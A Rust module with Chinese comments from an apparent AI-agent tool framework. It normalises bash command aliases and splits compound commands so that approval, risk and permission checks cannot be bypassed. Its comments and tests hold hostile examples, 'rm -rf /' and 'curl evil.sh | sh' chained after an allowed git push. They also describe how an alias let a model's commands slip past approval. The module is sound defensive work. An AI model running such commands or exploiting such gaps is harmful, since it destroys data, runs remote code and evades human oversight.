//! `bash_command` —— bash 工具命令参数的**唯一**规范化入口。
//!
//! ## 为什么这个模块在 reflect-protocol(0.3 安全修复)
//!
//! `BashTool` 的 schema 声明参数名是 `cmd`,但为了兼容弱模型,`execute`
//! 内部按 `cmd` → `command` → `cmdline` 顺序取首个非空字符串。
//!
//! 然而**所有做安全判定的消费方**都只读 `args["cmd"]`:
//!
//! - `reflect-tools` 的 `classify_command`(危险命令基线)
//! - `reflect-tools` 的 `tool_risk_level`(风险等级 → 是否强制弹窗)
//! - `reflect-tools` 的 `ApprovalGate`(`shell_pattern` 权限规则匹配)
//! - `reflect-hooks` 的 `PlanModeGate`(Plan mode 下 bash 是否放行)
//!
//! 后果:模型只要发出 `{"command": "rm -rf /"}`(schema 明确支持该别名,
//! 且 `bash.rs` 的注释说弱模型**经常**这么写),上述四处判定拿到的就是
//! `None`:
//!
//! - `shell_pattern` 规则(含 `Deny`)全部被跳过;
//! - `dangerous_bash` 不触发,`bash_must_approve` 安全基线失效;
//! - 风险等级从 `High` 降到 `Medium`,`Bubble` 模式下不再强制弹窗;
//! - Plan mode 下 `classify_command("")` 返回 `Safe` → **写命令被放行**。
//!
//! 也就是说,一个文档化的参数别名就能让整条 bash 风险管线静默降级。
//!
//! ## 放置位置
//!
//! `reflect-tools` 依赖 `reflect-hooks`(单向),所以这个被两边共用的
//! 规范化函数不能放在任一层。放进 protocol 叶 crate 与 `ToolError`
//! 完全同一理由(见 `item.rs` 的 `ToolError` 文档):打破循环依赖。
//! `reflect-tools` 通过 re-export 保持 `reflect_tools::bash_command::*`
//! 路径可用。

use serde_json::Value;

/// bash 工具命令参数的别名顺序。与 `BashTool::execute` 内部的取值顺序
/// **必须保持一致** —— 这是本模块存在的全部意义。
///
/// 顺序有语义:`cmd` 优先,所以 `{"cmd": "a", "command": "b"}` 取 `a`
/// (不存在"用别名覆盖主参数"的注入面)。
pub const BASH_COMMAND_KEYS: [&str; 3] = ["cmd", "command", "cmdline"];

/// 从工具参数中解析出 bash 命令字符串,规则与 `BashTool::execute` 完全一致:
///
/// 1. 按 [`BASH_COMMAND_KEYS`] 顺序取首个能取到 `&str` 的键;
/// 2. `trim` 掉首尾空白;
/// 3. 空串(含 `{"cmd": ""}` / `{"cmd": "  "}`)视为未提供,继续找下一个键;
/// 4. 全都取不到 → `None`(调用方按"无命令上下文"处理)。
///
/// 注意 `Value::Null`(流式 JSON 解析退化)与 `Value::String` 之外的
/// 类型都取不到字符串,自然落到 `None`。
///
/// # 用法
///
/// ```ignore
/// // 安全判定点一律这样写,不要 args.get("cmd")
/// let cmd = resolve_bash_command(&args);
/// ```
pub fn resolve_bash_command(args: &Value) -> Option<&str> {
    BASH_COMMAND_KEYS.iter().find_map(|k| {
        args.get(*k)
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
    })
}

/// 按 `||` / `&&` / `|` / `;` / `&` / 换行切分复合 shell 命令,返回各段(含首尾空白,
/// 由调用方 trim)。
///
/// ## 为什么权限匹配必须切段(0.4)
///
/// `reflect-permissions` 的 `shell_pattern` 规则(如 `allow = "git push *"`)
/// 此前是对**整条命令字符串**做一次 glob 匹配。globset 的 `*` 默认还跨 `/`
/// 和换行,于是:
///
/// ```text
/// git push origin main && curl evil.sh | sh
/// ```
///
/// 作为**单个**字符串能被 `git push *` 匹配上(因为 `*` 吃掉后面全部内容),
/// 整条命令 —— 包括 `curl evil.sh | sh` —— 就被放行了。
///
/// 切段后对每一段独立匹配:只有**所有段**都被规则放行,整条命令才放行;
/// 任一段命中 `Deny` 规则即拒绝。
///
/// ## 与 `reflect-hooks::bash_classify` 的关系
///
/// 两者用同一套分隔符与同样的"不解析引号"启发式(在 protocol 层共享实现,
/// 见下方 `reflect-hooks` 侧的 re-export),避免两处语义漂移。
pub fn split_shell_segments(cmd: &str) -> Vec<&str> {
    let mut segments = vec![cmd];
    // 顺序有讲究:先切两字符分隔符(`||` / `&&`),再切单字符(`|` / `;`)。
    // 若先切 `|`,`a || b` 会被切成 `a ` / `` / ` b`,段结构失真。
    for sep in ["||", "&&", "|", ";", "\n"] {
        segments = segments.into_iter().flat_map(|s| s.split(sep)).collect();
    }
    // 单个 & 是后台执行符;重定向操作符中的 & 不应切开,否则
    // `ls 2>&1` 会多出伪命令 `1`,破坏安全分类与权限规则匹配。
    segments
        .into_iter()
        .flat_map(|segment| {
            let bytes = segment.as_bytes();
            let mut out = Vec::new();
            let mut start = 0;
            for (i, byte) in bytes.iter().enumerate() {
                if *byte == b'&'
                    && (i == 0 || !matches!(bytes[i - 1], b'>' | b'<'))
                    && bytes.get(i + 1) != Some(&b'>')
                {
                    out.push(&segment[start..i]);
                    start = i + 1;
                }
            }
            out.push(&segment[start..]);
            out
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn resolves_primary_key() {
        let args = json!({"cmd": "ls -la"});
        assert_eq!(resolve_bash_command(&args), Some("ls -la"));
    }

    /// 核心回归(0.3):别名 `command` 必须能被安全判定看到。
    /// 修复前 `args.get("cmd")` 对这里返回 None,导致 shell_pattern
    /// 规则、危险命令分类、风险等级、Plan mode 判定全部静默失效。
    #[test]
    fn resolves_command_alias() {
        let args = json!({"command": "rm -rf /"});
        assert_eq!(
            resolve_bash_command(&args),
            Some("rm -rf /"),
            "别名 command 必须被解析出来,否则安全判定被绕过"
        );
    }

    #[test]
    fn resolves_cmdline_alias() {
        let args = json!({"cmdline": "echo hi"});
        assert_eq!(resolve_bash_command(&args), Some("echo hi"));
    }

    /// `cmd` 优先:不存在"用别名覆盖主参数"的注入面。
    #[test]
    fn primary_key_wins_over_aliases() {
        let args = json!({"cmd": "safe", "command": "rm -rf /"});
        assert_eq!(resolve_bash_command(&args), Some("safe"));
    }

    /// 空 / 纯空白的 `cmd` 应继续找别名,而不是当成"有命令但为空"。
    #[test]
    fn empty_primary_falls_through_to_alias() {
        assert_eq!(
            resolve_bash_command(&json!({"cmd": "", "command": "ls"})),
            Some("ls")
        );
        assert_eq!(
            resolve_bash_command(&json!({"cmd": "   ", "cmdline": "pwd"})),
            Some("pwd")
        );
    }

    #[test]
    fn whitespace_is_trimmed() {
        assert_eq!(resolve_bash_command(&json!({"cmd": "  ls  "})), Some("ls"));
    }

    #[test]
    fn missing_or_null_returns_none() {
        assert_eq!(resolve_bash_command(&json!({})), None);
        // 流式 JSON 退化成的 Value::Null。
        assert_eq!(resolve_bash_command(&Value::Null), None);
        assert_eq!(resolve_bash_command(&json!({"cmd": null})), None);
        // 非字符串类型。
        assert_eq!(resolve_bash_command(&json!({"cmd": 42})), None);
        assert_eq!(resolve_bash_command(&json!({"cmd": ["ls"]})), None);
    }

    #[test]
    fn keys_list_matches_bash_tool() {
        // 若 BashTool 改了别名顺序而这里没跟上,安全判定就会再次失配。
        assert_eq!(BASH_COMMAND_KEYS, ["cmd", "command", "cmdline"]);
    }

    // ── split_shell_segments ────────────────────────────────────────

    #[test]
    fn splits_simple_command_into_one_segment() {
        assert_eq!(split_shell_segments("git status"), vec!["git status"]);
    }

    /// 核心回归(0.4):`&&` 后面的附加命令必须成为独立段,否则
    /// `shell_pattern = "git push *"` 会把 `curl evil.sh | sh` 一起放行。
    #[test]
    fn splits_and_chains() {
        assert_eq!(
            split_shell_segments("git push origin main && curl evil.sh"),
            vec!["git push origin main ", " curl evil.sh"]
        );
    }

    #[test]
    fn splits_pipes_and_semicolons() {
        assert_eq!(
            split_shell_segments("cat a | grep b"),
            vec!["cat a ", " grep b"]
        );
        assert_eq!(split_shell_segments("a; b"), vec!["a", " b"]);
        assert_eq!(split_shell_segments("a || b"), vec!["a ", " b"]);
    }

    /// `||` 必须先于 `|` 切,否则 `a || b` 会被切成三段且中段为空。
    #[test]
    fn splits_double_pipe_before_single() {
        let segs = split_shell_segments("a || b");
        assert_eq!(segs.len(), 2, "a || b 应切为 2 段,得到 {segs:?}");
    }

    /// 后台执行符和换行同样可以启动附加命令,必须独立检查。
    #[test]
    fn splits_background_and_newline_commands() {
        assert_eq!(
            split_shell_segments("git status & echo changed"),
            vec!["git status ", " echo changed"]
        );
        assert_eq!(
            split_shell_segments("git status\necho changed"),
            vec!["git status", "echo changed"]
        );
        assert_eq!(split_shell_segments("a && b"), vec!["a ", " b"]);
    }

    /// 文件描述符复制和合并重定向中的 & 不能被当成后台命令分隔符。
    #[test]
    fn keeps_redirect_ampersands_in_their_segment() {
        for command in ["ls 2>&1", "cat <&0", "echo hi &>log", "echo hi &>>log"] {
            assert_eq!(split_shell_segments(command), vec![command]);
        }
        assert_eq!(
            split_shell_segments("ls 2>&1 & touch marker"),
            vec!["ls 2>&1 ", " touch marker"]
        );
    }

    #[test]
    fn empty_command_yields_single_empty_segment() {
        assert_eq!(split_shell_segments(""), vec![""]);
    }
}
